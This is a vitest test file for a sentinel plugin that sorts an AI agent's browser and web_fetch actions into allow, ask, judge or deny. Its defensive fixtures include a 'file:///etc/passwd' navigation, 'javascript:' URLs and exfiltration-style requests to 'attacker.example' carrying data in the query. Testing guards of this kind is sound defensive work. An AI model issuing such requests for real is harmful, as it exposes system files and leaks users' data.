import { describe, expect, it } from "vitest";
import { classify, NO_SNAPSHOT_REASON, STALE_SNAPSHOT_REASON } from "./classify.js";
import { SnapshotCache } from "./snapshot.js";
import {
  buttonsSnapshot,
  CHECKOUT_SNAPSHOT,
  CHECKOUT_SNAPSHOT_RENUMBERED,
  CHECKOUT_URL,
  wrapSnapshot,
} from "./test-helpers.js";
import type { ActionDescriptor, Decision, SentinelMode } from "./types.js";
import { resolveSentinelConfig } from "./types.js";

// Browser rules, driven through classify() as the plugin calls it.

function info(mode: SentinelMode = "outbound", snapshots?: SnapshotCache) {
  return {
    config: resolveSentinelConfig({ owners: { telegram: ["123456789"] }, mode }),
    snapshots,
  };
}

function actionOf(decision: Decision): ActionDescriptor {
  if (decision.kind !== "ask" && decision.kind !== "judge") {
    throw new Error(`expected ask or judge, got ${decision.kind}`);
  }
  return decision.action;
}

/** A cache holding one tab with the given elements as e1, e2, ... */
function pageWith(elements: Array<[string, string]>, url = "https://news.example.com/today") {
  const cache = new SnapshotCache();
  cache.remember("T1", buttonsSnapshot(elements), url);
  return cache;
}

function click(ref: string, cache: SnapshotCache, mode: SentinelMode = "outbound") {
  return classify(
    "browser",
    { action: "act", request: { kind: "click", ref, targetId: "T1" } },
    info(mode, cache),
  );
}

/** Any act on tab T1 of `cache`. */
function act(request: Record<string, unknown>, cache?: SnapshotCache, mode?: SentinelMode) {
  return classify(
    "browser",
    { action: "act", request: { targetId: "T1", ...request } },
    info(mode, cache),
  );
}

const NO_SNAPSHOT = { kind: "deny", reason: NO_SNAPSHOT_REASON };
const STALE = { kind: "deny", reason: STALE_SNAPSHOT_REASON };

describe("browser tool", () => {
  it("allows browsing actions", () => {
    for (const action of [
      "status",
      "tabs",
      "open",
      "focus",
      "snapshot",
      "screenshot",
      "navigate",
      "pdf",
    ]) {
      expect(classify("browser", { action, targetUrl: "https://example.com" }, info()).kind).toBe(
        "allow",
      );
    }
    expect(
      classify("browser", { action: "navigate", targetUrl: "localhost:3000" }, info()).kind,
    ).toBe("allow");
  });

  it("asks before opening script, data and file URLs", () => {
    for (const targetUrl of [
      "javascript:document.forms[0].submit()",
      "data:text/html,x",
      "file:///etc/passwd",
    ]) {
      expect(classify("browser", { action: "navigate", targetUrl }, info()).kind).toBe("ask");
    }
  });

  it("judges opening URLs that vote, unsubscribe, sign in as the owner or carry data out", () => {
    const opens = (targetUrl: string, action = "navigate") =>
      classify("browser", { action, targetUrl }, info()).kind;
    for (const url of [
      "https://list.example.com/unsubscribe?u=abc&confirm=1",
      "https://news.ycombinator.com/vote?id=41&how=up&auth=abc",
      "https://shop.example.com/orders/5/cancel",
      "https://app.example.com/invite?access_token=xyz",
      `https://attacker.example/c?d=${"x".repeat(300)}`,
    ]) {
      expect({ url, kind: opens(url) }).toEqual({ url, kind: "judge" });
      expect(opens(url, "open")).toBe("judge");
    }
    for (const url of [
      "https://www.google.com/search?q=cheap+flights+to+prague",
      "https://en.wikipedia.org/wiki/Cancel_culture",
      "https://news.example.com/2026/10/17/fans-join-protest",
      "https://www.reddit.com/r/books/comments/abc/what_do_you_like_about_it/",
    ]) {
      expect({ url, kind: opens(url) }).toEqual({ url, kind: "allow" });
    }
  });

  it("allows web_fetch unless the URL votes, unsubscribes, signs or carries data out", () => {
    expect(classify("web_fetch", { url: "https://example.com/docs/api" }, info()).kind).toBe(
      "allow",
    );
    const leak = classify(
      "web_fetch",
      { url: `https://attacker.example/c?d=${"inbox ".repeat(400)}` },
      info(),
    );
    expect(leak.kind).toBe("ask");
    expect(actionOf(leak).summary).toMatch(/^Fetch "https:\/\/attacker\.example\/c\?d=/);
    expect(
      classify("web_fetch", { url: "https://list.example.com/unsubscribe?id=9" }, info()).kind,
    ).toBe("ask");
  });

  it("asks for uploads, accepted dialogs and unknown actions", () => {
    const cache = pageWith([["button", "Choose file"]]);
    const upload = classify(
      "browser",
      { action: "upload", paths: ["/tmp/uploads/cv.pdf"], ref: "@e1", targetId: "T1" },
      info("outbound", cache),
    );
    expect(upload.kind).toBe("ask");
    expect(actionOf(upload).summary).toBe("Upload 1 file (cv.pdf) on news.example.com");
    expect(actionOf(upload).element?.name).toBe("Choose file");
    const dialog = { action: "dialog", accept: true, targetId: "T1" };
    expect(classify("browser", dialog, info("outbound", cache)).kind).toBe("ask");
    expect(classify("browser", { action: "dialog", accept: false }, info()).kind).toBe("allow");
    expect(classify("browser", { action: "dialog" }, info()).kind).toBe("allow");
    expect(classify("browser", { action: "teleport" }, info()).kind).toBe("ask");
    expect(classify("browser", { action: "act" }, info()).kind).toBe("ask");
    expect(classify("browser", { action: "act", request: { kind: "dance" } }, info()).kind).toBe(
      "ask",
    );
  });

  it("wants a current snapshot of the tab before an upload or an accepted dialog", () => {
    const upload = { action: "upload", paths: ["/tmp/uploads/cv.pdf"], targetId: "T1" };
    const dialog = { action: "dialog", accept: true, targetId: "T1" };
    for (const params of [upload, dialog]) {
      expect(classify("browser", params, info())).toEqual(NO_SNAPSHOT);
      const cache = pageWith([["button", "Choose file"]]);
      cache.noteChange("T1");
      expect(classify("browser", params, info("outbound", cache))).toEqual(STALE);
      // With the sentinel off these checks do not apply.
      expect(classify("browser", params, info("off")).kind).toBe("allow");
    }
    // A ref that is not in the snapshot.
    const cache = pageWith([["button", "Choose file"]]);
    expect(classify("browser", { ...upload, ref: "e9" }, info("outbound", cache))).toEqual(
      NO_SNAPSHOT,
    );
  });

  it("allows harmless act kinds and denies page JavaScript", () => {
    for (const kind of ["hover", "wait", "resize", "scrollIntoView", "close"]) {
      expect(classify("browser", { action: "act", request: { kind } }, info()).kind).toBe("allow");
    }
    for (const request of [
      { kind: "evaluate", fn: "() => 1" },
      { kind: "wait", fn: "() => true" },
    ]) {
      for (const mode of ["outbound", "off"] as const) {
        expect(classify("browser", { action: "act", request }, info(mode))).toEqual({
          kind: "deny",
          reason:
            "BLOCKED by Muse Sentinel: running JavaScript in the page is turned off on this Muse server.",
        });
      }
    }
  });

  it("judges typing that submits and allows plain typing", () => {
    const cache = pageWith([["textbox", "Message"]]);
    const type = (request: Record<string, unknown>) =>
      act({ kind: "type", ref: "e1", ...request }, cache).kind;
    expect(type({ text: "hello" })).toBe("allow");
    expect(type({ text: "hello", submit: true })).toBe("judge");
    expect(type({ text: "hello", submit: "true" })).toBe("judge");
    expect(type({ text: "hello\n", slowly: true })).toBe("judge");
    expect(type({ text: "hello", slowly: true })).toBe("allow");
    // Plain typing needs no snapshot at all (it only sets the field's value).
    expect(act({ kind: "type", ref: "e1", text: "hi" }).kind).toBe("allow");
    expect(act({ kind: "type", ref: "e1", text: "hi", submit: true })).toEqual(NO_SNAPSHOT);
  });

  it("judges typing slowly into anything but a text field (core clicks it first)", () => {
    const cache = pageWith([
      ["button", "Place order"],
      ["searchbox", "Search"],
      ["spinbutton", "Quantity"],
    ]);
    const slow = (ref: string, slowly: unknown = true) =>
      act({ kind: "type", ref, text: "", slowly }, cache);
    expect(slow("e1").kind).toBe("judge");
    expect(slow("e1", "yes").kind).toBe("judge");
    expect(actionOf(slow("e1")).element?.name).toBe("Place order");
    expect(slow("e2").kind).toBe("allow");
    expect(slow("e3").kind).toBe("allow");
    expect(slow("e9")).toEqual(NO_SNAPSHOT);
    // slowly is part of the approval key.
    const fast = actionOf(act({ kind: "type", ref: "e2", text: "x", submit: true }, cache));
    const slowSubmit = actionOf(
      act({ kind: "type", ref: "e2", text: "x", submit: true, slowly: true }, cache),
    );
    expect(fast.semanticKey).not.toBe(slowSubmit.semanticKey);
  });

  it("allows only navigation keys and judges every other key", () => {
    const cache = pageWith([["textbox", "Message"]]);
    const press = (key: string) => act({ kind: "press", key }, cache).kind;
    for (const key of ["Tab", "Shift+Tab", "ArrowDown", "ArrowLeft", "Escape", "PageDown", "End"]) {
      expect(press(key)).toBe("allow");
    }
    for (const key of ["Enter", "NumpadEnter", "Control+Enter", " ", "Space", "a", "l", "#"]) {
      expect(press(key)).toBe("judge");
    }
    expect(press("Delete")).toBe("judge");
    // Navigation keys need no snapshot; other keys do.
    expect(act({ kind: "press", key: "Tab" }).kind).toBe("allow");
    expect(act({ kind: "press", key: "Enter" })).toEqual(NO_SNAPSHOT);
  });

  it("judges a key press against the focused element, never the ref the agent names", () => {
    const cache = new SnapshotCache();
    cache.remember(
      "T1",
      wrapSnapshot(
        [
          '- searchbox "Search chats" [ref=e2]',
          '- textbox "Type a message" [active] [ref=e4]: the secret',
        ].join("\n"),
      ),
      "https://web.whatsapp.com/",
    );
    const action = actionOf(act({ kind: "press", key: "Enter", ref: "e2" }, cache));
    expect(action.element).toMatchObject({ role: "textbox", name: "Type a message" });
    expect(action.summary).toBe('Press Enter in "Type a message" on web.whatsapp.com');
    expect(action.detail).toContain("the secret");
    // Without a focus marker (role-mode snapshots) there is no element to show.
    const plain = pageWith([["searchbox", "Search chats"]]);
    const blind = actionOf(act({ kind: "press", key: "Enter", ref: "e1" }, plain));
    expect(blind.element).toBeUndefined();
    expect(blind.detail).toContain("the sentinel cannot see which");
  });

  it("judges select, fill and drag where they can act like a click", () => {
    // select fires change handlers: judged when a value, the field or the form mentions
    // something risky or money.
    const search = pageWith([["combobox", "Sort by"]], "https://news.example.com/search");
    expect(act({ kind: "select", ref: "e1", values: ["Newest"] }, search).kind).toBe("allow");
    expect(act({ kind: "select", ref: "e1", values: ["0 (Delete)"] }, search).kind).toBe("judge");
    expect(act({ kind: "select", ref: "e1", values: ["Pro, €5"] }, search).kind).toBe("judge");
    expect(act({ kind: "select", ref: "e9", values: ["Newest"] }, search)).toEqual(NO_SNAPSHOT);
    const cache = pageWith(
      [
        ["combobox", "Sort by"],
        ["switch", "Auto-renew subscription"],
        ["textbox", "Name"],
        ["link", "Invoice.pdf"],
        ["link", "Trash"],
        ["checkbox", "Show more"],
      ],
      "https://drive.example.com/files",
    );
    const kind = (request: Record<string, unknown>) => act(request, cache).kind;
    // The same harmless value next to a subscription switch goes to the guard.
    expect(kind({ kind: "select", ref: "e1", values: ["Newest"] })).toBe("judge");
    // fill sets checkboxes and switches with a click.
    const toggle = (ref: string, type = "checkbox") =>
      kind({ kind: "fill", fields: [{ ref, type, value: false }] });
    expect(toggle("e2")).toBe("judge");
    expect(toggle("e2", " Radio ")).toBe("judge");
    expect(toggle("e6")).toBe("allow");
    expect(toggle("e3", "textbox")).toBe("allow");
    expect(act({ kind: "fill", fields: [{ ref: "e9", type: "checkbox" }] }, cache)).toEqual(
      NO_SNAPSHOT,
    );
    const fill = actionOf(act({ kind: "fill", fields: [{ ref: "e2", type: "checkbox" }] }, cache));
    expect(fill.summary).toBe('Turn "Auto-renew subscription" off on drive.example.com');
    // drag is always the guard's call.
    const drag = act({ kind: "drag", startRef: "e4", endRef: "e5" }, cache);
    expect(drag.kind).toBe("judge");
    expect(actionOf(drag).summary).toBe('Drag "Invoice.pdf" onto "Trash" on drive.example.com');
    expect(act({ kind: "drag", startRef: "e4", endRef: "e99" }, cache)).toEqual(NO_SNAPSHOT);
  });

  it("reads refs the way the browser does (@e7, ref=e7)", () => {
    const cache = pageWith([
      ["link", "Home"],
      ["link", "Unsubscribe from this list"],
    ]);
    for (const ref of ["@e2", "ref=e2", " e2 "]) {
      const decision = click(ref, cache);
      expect(decision.kind).toBe("judge");
      expect(actionOf(decision).element?.name).toBe("Unsubscribe from this list");
    }
    expect(click("@e1", cache).kind).toBe("allow");
  });

  it("refuses to judge from a snapshot taken before the page changed", () => {
    const cache = pageWith([
      ["button", "Next"],
      ["textbox", "Message"],
    ]);
    expect(click("e1", cache).kind).toBe("allow");
    // Something ran on the tab: the button may now read "Place order".
    cache.noteChange("T1");
    expect(click("e1", cache)).toEqual(STALE);
    expect(act({ kind: "press", key: "Enter" }, cache)).toEqual(STALE);
    // Typing and navigation keys do not depend on the snapshot.
    expect(act({ kind: "type", ref: "e2", text: "hi" }, cache).kind).toBe("allow");
    expect(act({ kind: "press", key: "Tab" }, cache).kind).toBe("allow");
    // A new snapshot makes it current again.
    cache.remember("T1", buttonsSnapshot([["button", "Next"]]), "https://news.example.com/today");
    expect(click("e1", cache).kind).toBe("allow");
    // With the sentinel off nothing is held back.
    cache.noteChange("T1");
    expect(click("e1", cache, "off").kind).toBe("allow");
  });

  it("does not judge on a tab it has no snapshot of", () => {
    const cache = pageWith([["link", "Home"]]);
    for (const targetId of ["\u0000unknown-tab", "OTHER"]) {
      expect(
        classify(
          "browser",
          { action: "act", request: { kind: "click", ref: "e1", targetId } },
          info("outbound", cache),
        ),
      ).toEqual(NO_SNAPSHOT);
    }
  });

  describe("clicks", () => {
    it("allows links without risky words and judges risky ones", () => {
      const cache = pageWith([
        ["link", "Example Shop"],
        ["link", "Delete account"],
        ["link", "Odeslat"],
        ["link", ""],
      ]);
      expect(click("e1", cache).kind).toBe("allow");
      expect(click("e2", cache).kind).toBe("judge");
      expect(click("e3", cache).kind).toBe("judge");
      expect(click("e4", cache).kind).toBe("allow");
    });

    it("allows buttons with a safe name and judges risky or unknown ones", () => {
      const allowed = [
        "Search",
        "Next",
        "Back",
        "Close",
        "Show more",
        "Accept all",
        "Reject all",
        "Sign in",
        "Log in",
        "View details",
        "Filters",
        "Sort by price",
        // Czech
        "Hledat",
        "Další",
        "Zpět",
        "Zavřít",
        "Přijmout vše",
        "Odmítnout",
        "Přihlásit se",
        "Zobrazit více",
      ];
      const judged = [
        "Place order",
        "Send",
        "Submit",
        "Post",
        "Publish",
        "Reply",
        "Share",
        "Buy now",
        "Checkout",
        "Pay",
        "Book now",
        "Reserve",
        "Confirm",
        "Subscribe",
        "Unsubscribe",
        "Delete",
        "Remove",
        "Cancel subscription",
        "Transfer",
        "Donate",
        "Sign up",
        "Register",
        "Apply",
        "Upload",
        "Save changes",
        "Update",
        "Accept offer",
        "Bid",
        "Close account",
        "Continue",
        "Next: payment",
        // Czech, with and without accents
        "Odeslat",
        "Poslat",
        "Koupit",
        "Objednat",
        "Zaplatit",
        "Rezervovat",
        "Potvrdit",
        "Smazat",
        "Odstranit",
        "Zrušit",
        "Zrusit",
        "Přihlásit k odběru",
        "Registrovat",
        "Nahrát",
        "Uložit",
        "Sdílet",
        "Publikovat",
        "Zveřejnit",
        "Odeslat objednávku",
        // Safe word in a long name does not count
        "Show me how to close this account forever",
        // A safe word followed by more than a small noun does not count
        "Close issue",
        "Agree & Join",
        "I agree to the terms",
        // "Agree" without a cookie banner around it accepts terms
        "I agree",
        "Souhlasím",
      ];
      const elements: Array<[string, string]> = [
        ...allowed.map((n): [string, string] => ["button", n]),
        ...judged.map((n): [string, string] => ["button", n]),
      ];
      const cache = pageWith(elements);
      elements.forEach(([, name], i) => {
        const expected = i < allowed.length ? "allow" : "judge";
        expect({ name, kind: click(`e${i + 1}`, cache).kind }).toEqual({ name, kind: expected });
      });
    });

    it("allows focusing fields and switching tabs, judges other roles", () => {
      const cache = pageWith([
        ["tab", "Reviews"],
        ["textbox", "Message"],
        ["searchbox", "Search"],
        ["checkbox", "Remember me"],
        ["menuitem", "More"],
        ["generic", "Weird div"],
        ["button", ""],
      ]);
      expect(click("e1", cache).kind).toBe("allow");
      expect(click("e2", cache).kind).toBe("allow");
      expect(click("e3", cache).kind).toBe("allow");
      expect(click("e4", cache).kind).toBe("judge");
      expect(click("e5", cache).kind).toBe("allow");
      expect(click("e6", cache).kind).toBe("judge");
      expect(click("e7", cache).kind).toBe("judge");
    });

    it("refuses a click it cannot resolve instead of asking about it", () => {
      expect(click("e42", pageWith([["button", "Search"]]))).toEqual(NO_SNAPSHOT);
      expect(
        classify("browser", { action: "act", request: { kind: "click", ref: "e1" } }, info()),
      ).toEqual(NO_SNAPSHOT);
      expect(act({ kind: "click" }, pageWith([["button", "Search"]]))).toEqual(NO_SNAPSHOT);
    });

    it("judges links whose address votes, unsubscribes, signs or runs script", () => {
      const cache = new SnapshotCache();
      cache.remember(
        "T1",
        wrapSnapshot(
          [
            '- link "upvote" [ref=e1] [cursor=pointer]:',
            "  - /url: vote?id=41&how=up&auth=abc",
            '- link "Click here" [ref=e2] [cursor=pointer]:',
            "  - /url: https://list.example.com/unsubscribe?id=9&confirm=1",
            '- link "Show" [ref=e3] [cursor=pointer]:',
            '  - /url: "javascript:document.forms[0].submit()"',
            '- link "Ask HN: what are you reading?" [ref=e4] [cursor=pointer]:',
            "  - /url: item?id=42",
            '- link "Fans join the protest" [ref=e5] [cursor=pointer]:',
            "  - /url: /2026/10/17/fans-join-protest",
            '- link "flag" [ref=e6]',
          ].join("\n"),
        ),
        "https://news.ycombinator.com/",
      );
      for (const ref of ["e1", "e2", "e3", "e6"]) {
        expect({ ref, kind: click(ref, cache).kind }).toEqual({ ref, kind: "judge" });
      }
      expect(actionOf(click("e2", cache)).detail).toContain("Link target: https://list.example");
      expect(click("e4", cache).kind).toBe("allow");
      expect(click("e5", cache).kind).toBe("allow");
    });

    it("judges every click on checkout pages", () => {
      const cache = new SnapshotCache();
      cache.remember("T1", CHECKOUT_SNAPSHOT, CHECKOUT_URL);
      expect(click("e3", cache).kind).toBe("judge");
      const decision = click("e8", cache);
      expect(decision.kind).toBe("judge");
      const action = actionOf(decision);
      expect(action.summary).toBe('Click "Place order" on shop.example.com');
      expect(action.url).toBe(CHECKOUT_URL);
      expect(action.element).toMatchObject({ role: "button", name: "Place order" });
      expect(action.detail).toContain("Card number");
    });

    it("uses the most recent tab when the request has no targetId", () => {
      const cache = pageWith([["button", "Search"]]);
      expect(
        classify(
          "browser",
          { action: "act", request: { kind: "click", ref: "e1" } },
          info("outbound", cache),
        ).kind,
      ).toBe("allow");
    });
  });

  it("keeps the semantic key stable across ref renumbering", () => {
    const first = new SnapshotCache();
    first.remember("T1", CHECKOUT_SNAPSHOT, CHECKOUT_URL);
    const second = new SnapshotCache();
    second.remember("T1", CHECKOUT_SNAPSHOT_RENUMBERED, CHECKOUT_URL);
    const a = actionOf(click("e8", first));
    const b = actionOf(click("e18", second));
    expect(a.semanticKey).toBe(b.semanticKey);
    // A different element on the same page is a different action.
    const other = actionOf(click("e4", first));
    expect(other.semanticKey).not.toBe(a.semanticKey);
    // The same button on another page, or another query or fragment, is a different action.
    for (const url of [
      "https://other.example.com/checkout",
      `${CHECKOUT_URL}?cart=2`,
      `${CHECKOUT_URL}#compose=other`,
    ]) {
      const third = new SnapshotCache();
      third.remember("T1", CHECKOUT_SNAPSHOT, url);
      expect(actionOf(click("e8", third)).semanticKey).not.toBe(a.semanticKey);
    }
  });

  it("ties the key to the form around the element and to changes on the tab", () => {
    const form = (to: string) =>
      buttonsSnapshot([
        ["textbox", `To: ${to}`],
        ["button", "Send"],
      ]);
    const page = (to: string) => {
      const cache = new SnapshotCache();
      cache.remember("T1", form(to), "https://mail.example.com/compose?draft=1");
      return cache;
    };
    const alice = actionOf(click("e2", page("alice@example.com")));
    expect(actionOf(click("e2", page("alice@example.com"))).semanticKey).toBe(alice.semanticKey);
    expect(actionOf(click("e2", page("mallory@evil.test"))).semanticKey).not.toBe(
      alice.semanticKey,
    );
    // Anything that ran on the tab after the request (even far from the button) needs a new one.
    const changed = page("alice@example.com");
    changed.noteChange("T1");
    changed.remember("T1", form("alice@example.com"), "https://mail.example.com/compose?draft=1");
    expect(actionOf(click("e2", changed)).semanticKey).not.toBe(alice.semanticKey);
  });

  it("tells duplicate elements apart in the semantic key", () => {
    const cache = pageWith([
      ["button", "Delete"],
      ["button", "Delete"],
    ]);
    expect(actionOf(click("e1", cache)).semanticKey).not.toBe(
      actionOf(click("e2", cache)).semanticKey,
    );
  });

  it("keeps the typed-text key stable and sensitive to the text", () => {
    const cache = pageWith([["textbox", "Message"]]);
    const type = (text: string) =>
      actionOf(
        classify(
          "browser",
          {
            action: "act",
            request: { kind: "type", ref: "e1", text, submit: true, targetId: "T1" },
          },
          info("outbound", cache),
        ),
      );
    expect(type("hi").semanticKey).toBe(type("hi").semanticKey);
    expect(type("hi").semanticKey).not.toBe(type("bye").semanticKey);
    expect(type("hi").summary).toBe('Type "hi" into "Message" and submit it on news.example.com');
  });

  it("strips bidi overrides from summaries", () => {
    const cache = pageWith([["button", "Search\u202e redro ecalP"]]);
    expect(actionOf(click("e1", cache)).summary).not.toContain("\u202e");
  });
});
